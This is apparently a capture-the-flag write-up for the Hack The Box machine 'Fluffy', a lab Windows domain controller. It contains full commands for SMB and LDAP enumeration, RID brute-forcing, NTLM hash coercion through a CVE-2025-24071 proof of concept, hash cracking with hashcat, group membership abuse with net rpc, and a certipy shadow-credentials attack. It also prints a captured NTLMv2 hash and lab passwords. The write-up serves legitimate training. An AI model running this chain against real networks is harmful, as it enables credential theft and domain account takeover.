# Fluffy

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## Enumeration

We are told this is a Windows box

Normal nmap scan reveals a lot of stuff opened:

```bash
└─$ nmap 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 13:13 CEST
Nmap scan report for 10.10.11.69
Host is up (0.034s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

Looks like SMB ports are opened, let's check what in there:

```
└─$ smbclient -L \\10.10.11.69 -N     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

In the IT share we see some interesting things:

```shell
└─$ smbclient \\\\10.10.11.69\\IT --user="j.fleischman"
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 30 17:27:03 2025
  ..                                  D        0  Wed Jul 30 17:27:03 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

                5842943 blocks of size 4096. 2236192 blocks available
smb: \> pwd
Current directory is \\10.10.11.69\IT\
```

Checking the changes from everything.exe shows something promising:

```
Friday, 20 June 2025: Version 1.4.1.1028
	fixed a crash when getting help text from a context menu item that throws an exception.
	updated localization.

Friday, 23 May 2025: Version 1.4.1.1027
	updated localization.
	improved security against dll hijacking.

Thursday, 1 August 2024: Version 1.4.1.1026
	updated localization.
```

Looks like version `1.4.1.1026` is vulnerable to dll hijacking.

In the SYSVOL, there's also an interesting file:

```shell
└─$ smbclient \\\\10.10.11.69\\SYSVOL --user="j.fleischman"
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 17 17:59:21 2025
  ..                                  D        0  Thu Apr 17 17:59:21 2025
  fluffy.htb                         Dr        0  Thu Apr 17 17:59:21 2025

                5842943 blocks of size 4096. 2236145 blocks available
smb: \>
```
This looks like some Active Directory policies or something similar. According to https://blog.netwrix.com/2017/01/30/sysvol-directory/ 

> The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share.

We'll now exfiliate the files from the samba share to our computer to analyze them.

The PDF warns the sysadm to patch the system to mitigate the impact of the following CVEs:

CVE-2025-24996 - Critical

Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use https://github.com/p0dalirius/Coercer to check if we're lucky.

CVE-2025-24071 - Critical

Looks like there's a poc for CVE-2025-24071: https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-. The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.

CVE-2025-46785 - High

Related with a Buffer overflow in Zoom Workplace application. Maybe to be used for privilege escalation?

CVE-2025-29968 - High

Looks like denial of service vulnerability

CVE-2025-21193 - Medium

Spoofing in Active Directory, might be interesting

CVE-2025-3445  - Low

Relates to mholt/archiver golang

Most likely one of these vulnerabilities will be useful to us

The networks shares contain some zip files containing some exe files. Maybe there are useful somehow?

- everything-1.4.1.exe: https://www.voidtools.com/faq/
- kepass-2.58.exe: https://keepass.info/news/n250709_2.59.html

We can enumerate all the users in the machine with `crackmapexec`:

```bash
crackmapexec smb fluffy.htb -u anonymous -p "" --rid-brute 10000 > users     
```

And discard garbage data:

```bash
cat users|grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\' |grep -Ev (DC|SVC) |tail -n +4 > users.txt
```

### LDAP enumeration

```bash
ldapdomaindump fluffy.htb -u 'fluffy.htb\j.fleischman' -p 'J0elTHEM4n1990!' --no-json --no-grep
```

This produces the list of computers, groups, users and permissions.

## CVE-2025-24071

We managed to fabricate the payload required and upload it via SMB. 

```bash
python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep 
```


When listening for events with responder, we get the NTLM Hash of user p.agila

```
[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:bd8f7fef990474ff:C7C0CB9CAC9525F2D208E32C10E7C248:0101000000000000001DAD238801DC01142342D76B81FA3800000000020008004E0058003800370001001E00570049004E002D0041005A00310051004E0056003200410030004400490004003400570049004E002D0041005A00310051004E005600320041003000440049002E004E005800380037002E004C004F00430041004C00030014004E005800380037002E004C004F00430041004C00050014004E005800380037002E004C004F00430041004C0007000800001DAD238801DC0106000400020000000800300030000000000000000100000000200000281213D3D4900283CBDD465132F4069EAD5996FF744C8BC81B4B59245480EF190A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310039000000000000000000
```

With hashcat and rockyou, we are able to retrieve the password: 

```bash
hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt
```

prometheusx-303

### Bloodhound

From the LDAP dump, we know that this user is a Service Account Manager.

We can use bloodhound to analyze the Active Directory data:

```bash
bloodhound-python -u "p.agila@fluffy.htb" -p "prometheusx-303" -ns 10.10.11.69 -d fluffy.htb -c all -dc dc01.fluffy.htb --zip
```

It is really import to collect all the fields, otherwise some permission declaration will not be present in the graph database. Also, the key was provide the `-dc` flag.

Using the bloodhound UI, we can see an interesting path: p.agila user reaches to the winrm_svc account, which most likely will allow us to connect to the machine with evil-winrm.

First, we need to add the user p.agila to SERVICE_ACCOUNTS group:

```bash
net rpc group addmem "SERVICE ACCOUNTS@FLUFFY.HTB" "p.agila" -U "fluffy.htb"/"P.AGILA"%"prometheusx-303" -S 10.10.11.69
```

The msDS-KeyCredentialLink attribute is a multi-valued attribute on AD user or computer objects used to store public key material (or references to it) for passwordless authentication methods like Windows Hello for Business (WHfB) and FIDO2 security keys. When a user attempts to authenticate using such a credential, the system presents a cryptographic proof tied to the private key, and AD validates it against the public key material linked via this attribute.

Attackers with write access to an account's msDS-KeyCredentialLink attribute can add their own public key material, creating what's known as "shadow credentials." This allows the attacker to subsequently authenticate as that user without needing their password, by using the corresponding private key they control. Certipy's shadow auto command can be used to exploit this if the necessary permissions are available. While distinct from AD CS certificate abuse, it's another form of key-based authentication bypass/persistence.

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This is because the clock is not synchronized between the attacking machine and the target. We need to sync the clock with the target machine:

Execute the following as root:

```bash
timedatectl set-ntp off
rdate -n [IP of Target]
```

This will stop NTP and sync the date and time with the IP provided.

After doing this, the shadow credential attack is successful and we retrieve the NT hash for `winrm_svc`

